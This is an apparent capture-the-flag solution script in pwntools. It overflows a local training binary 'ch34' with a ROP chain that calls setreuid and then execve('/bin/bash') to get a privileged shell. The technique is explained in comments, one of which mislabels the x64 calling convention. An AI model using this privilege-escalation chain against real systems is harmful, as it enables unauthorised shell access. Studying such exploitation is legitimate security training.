from pwn import * 


## Protection
#    Arch:     amd64-64-little
#    RELRO:    Partial RELRO
#    Stack:    No canary found
#    NX:       NX enabled
#    PIE:      No PIE (0x400000)

## Since it's staticly linked binary , it's not possible to ret 2 libc ,but luckily since it's staticly linked we can find a lot of usefull Gadgets ! 


##offset to RIP
offset = 0x110 * b"\xFF"
offset += b"\xEE"*8


## a basic idea is to set up arguments on registers (since it's x64 , calling conventions are _cdecl) , and do some syscall to invoke sys_execve 

## execve Definition
# execve(const char *pathname , char *const argv[] , char *const envp[])
# basicly we need to put address of /bin/bash on %RDI , the others we dont care but they should be zeroed (%RSI , %RDX) 

payload=offset
# First stage : putting /bin/bash on some fixed mem address 

# Virtual memory permissions :
#	Start              End                Perm	Name
#	0x00400000         0x004c0000         r-xp	/home/slash/x64-Advanced/ch34
#	0x006bf000         0x006c2000         rw-p	/home/slash/x64-Advanced/ch34
#	0x006c2000         0x006e8000         rw-p	[heap]
#	0x00007ffff7ffb000 0x00007ffff7ffe000 r--p	[vvar]
#	0x00007ffff7ffe000 0x00007ffff7fff000 r-xp	[vdso]
#	0x00007ffffffde000 0x00007ffffffff000 rw-p	[stack]
#	0xffffffffff600000 0xffffffffff601000 --xp	[vsyscall]

## We can write to the Heap , let's write our /bin/bash to
bin_bash_address = 0x6c2000

payload+= p64(0x4b81a7)		 # pop rcx ; ret
payload+=b'/bin/bas' 
payload+=p64(0x00000000004016d3) # pop rdi ;ret
payload+=p64(bin_bash_address)
payload+=p64(0x00000000004225e8) # mov qword ptr [rdi], rcx ; ret

# 'h' remaining
payload+= p64(0x4b81a7)          # pop rcx ; ret
payload+=b'h'+b'\x00'*7
payload+=p64(0x00000000004016d3) # pop rdi ;ret
payload+=p64(bin_bash_address+8)
payload+=p64(0x00000000004225e8) # mov qword ptr [rdi], rcx ; ret
log.info("\"/bin/bash\" at : "+hex(bin_bash_address))
# Second stage : calling setreuid so the shell doesnt drop privileges 
ruid = 1234
euid = 1234

# sys_setreuid , syscall number 113 , ruid on %rdi , euid on %rsi
payload+=p64(0x4016d3)		 # pop rdi ; ret
payload+=p64(ruid)
payload+=p64(0x00000000004017e7) # pop rsi ; ret
payload+=p64(euid)
payload+=p64(0x000000000044d2b4) # pop rax ; ret
payload+=p64(113)
payload+=p64(0x000000000045e8a5) # syscall ; cmp rax , 0xFFFFFFFFFFFFFFFF ; jnb _syscall_error ; ret
log.info("setreuid successfull !")

# 3rd stage : calling execve to execute /bin/bash
payload+=p64(0x00000000004017e7) # pop rsi ; ret
payload+=p64(0)
payload+=p64(0x0000000000437205) # pop rdx ; ret
payload+=p64(0)
payload+=p64(0x4016d3) 		 # pop rdi ; ret
payload+=p64(bin_bash_address)
payload+=p64(0x000000000044d2b4) # pop rax ; ret
payload+=p64(59)
payload+=p64(0x000000000045e8a5) # syscall ; cmp rax , 0xFFFFFFFFFFFFFFFF ; jnb _syscall_error ; ret
log.info("execve called successfully !")

log.info("SHELLY on the way !")
# For fun lets Do a clean exit 
payload+=p64(0x4016d3) 		 # pop rdi ; ret
payload+=p64(0)
payload+=p64(0x0000000004075B0)  # address of exit


# SHELLY 
proces = process("./ch34")

proces.sendline(payload)
proces.recvline()
proces.interactive()


